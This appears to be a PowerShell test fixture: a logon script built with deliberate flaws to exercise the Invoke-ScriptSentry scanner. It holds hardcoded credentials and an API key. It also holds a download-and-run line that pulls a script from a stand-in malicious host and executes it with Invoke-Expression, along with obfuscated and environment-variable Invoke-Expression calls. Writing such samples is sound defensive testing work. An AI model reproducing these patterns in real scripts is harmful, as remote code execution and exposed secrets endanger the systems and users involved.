# Test logon script with multiple vulnerabilities for Invoke-ScriptSentry

# Plaintext credentials
$username = "admin"
$password = "P@ssw0rd123"

# Sensitive information (API key)
$apiKey = "AKIA1234567890ABCDEF"

# Insecure practice: net use with credentials
net use Z: \\server\share /user:$username $password

# Elevated privileges
Start-Process -FilePath "cmd.exe" -Verb RunAs -ArgumentList "/c dir"

# Malicious code and known vulnerable pattern
$maliciousUrl = "https://malicious.example.com/script.ps1"
Invoke-WebRequest -Uri $maliciousUrl -OutFile "temp.ps1"
Invoke-Expression (Get-Content "temp.ps1")

# Obfuscated code
$encoded = "SGVsbG8gV29ybGQ=" # Base64 encoded "Hello World"
$decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
Invoke-Expression $decoded

# Invalid path
$invalidPath = "\\nonexistent.server\share\file.txt"
Copy-Item -Path $invalidPath -Destination "C:\Temp"

# External resource reference
$externalResource = "http://example.com/download.exe"
Invoke-WebRequest -Uri $externalResource -OutFile "download.exe"

# Vulnerable pattern with environment variable
Invoke-Expression $env:COMPUTERNAME